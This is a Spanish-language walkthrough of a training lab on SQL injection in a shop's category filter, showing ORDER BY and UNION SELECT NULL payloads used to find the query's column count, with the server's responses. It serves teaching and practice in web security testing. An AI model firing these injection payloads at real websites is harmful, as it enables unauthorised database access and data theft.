# 💉 Ataque UNION: descubriendo número de columnas

## 📄 Descripción del laboratorio

Este laboratorio contiene una vulnerabilidad de **inyección SQL en el filtro de productos por categoría**.

La respuesta del servidor refleja los resultados de la consulta en la página, lo que permite utilizar ataques **UNION SELECT** para recuperar datos adicionales desde la base de datos.

🎯 **Objetivo del laboratorio:**

* Determinar cuántas columnas devuelve la consulta original
* Construir un `UNION SELECT` válido que devuelva una fila adicional con valores `NULL`



## 📚 Teoría

Antes de poder extraer datos mediante un ataque **UNION**, es necesario conocer la estructura de la consulta original.

El requisito fundamental de `UNION` es que ambas consultas tengan:

```
el mismo número de columnas
tipos de datos compatibles
```

Si el número de columnas no coincide, la base de datos devolverá un error.

El proceso habitual para preparar un ataque UNION es:

```
1. Confirmar la inyección SQL
2. Determinar el número de columnas
3. Construir un UNION SELECT con el número correcto de columnas
```

Para descubrir el número de columnas existen dos métodos comunes:

```
ORDER BY
UNION SELECT con NULL
```

En este laboratorio utilizamos ambos.



## 📝 Práctica

### 1️⃣ Identificar el punto vulnerable

Navegamos por la tienda y seleccionamos una categoría, por ejemplo:

```
Gifts
```

Interceptamos la petición enviada al servidor:

```
/filter?category=Gifts
```

La enviamos a **Burp Repeater**.



### 2️⃣ Determinar el número de columnas con ORDER BY

Utilizamos `ORDER BY` para comprobar cuántas columnas existen en la consulta.

Probamos incrementando el índice:

```
/filter?category=' ORDER BY 1--
```

Respuesta normal.

```
/filter?category=' ORDER BY 2--
```

Respuesta normal.

```
/filter?category=' ORDER BY 3--
```

Respuesta normal.

```
/filter?category=' ORDER BY 4--
```

El servidor devuelve un error.

<img width="953" height="362" alt="image" src="https://github.com/user-attachments/assets/8b662e9c-350a-4252-a427-5da6086e06bf" />
<br>

Esto indica que la consulta original contiene **3 columnas**.



### 3️⃣ Confirmar con UNION SELECT

Ahora confirmamos el número de columnas utilizando `UNION SELECT`.

Probamos primero con una columna:

```
/filter?category=' UNION SELECT NULL--
```

El servidor devuelve un error.

Probamos con dos columnas:

```
/filter?category=' UNION SELECT NULL,NULL--
```

El servidor sigue devolviendo error.

Probamos con tres columnas:

```
/filter?category=' UNION SELECT NULL,NULL,NULL--
```

La consulta se ejecuta correctamente.

En la respuesta aparece **una fila adicional con valores nulos**.

<img width="1520" height="975" alt="image" src="https://github.com/user-attachments/assets/514f07e4-1d11-4fc7-8ba1-0399558acf5c" />



### 4️⃣ Resultado

Se consigue:

* Identificar que la consulta original devuelve **3 columnas**
* Construir un `UNION SELECT` válido
* Inyectar una fila adicional en la respuesta

Esto confirma que el ataque UNION está correctamente alineado.

✅ **Laboratorio resuelto.**
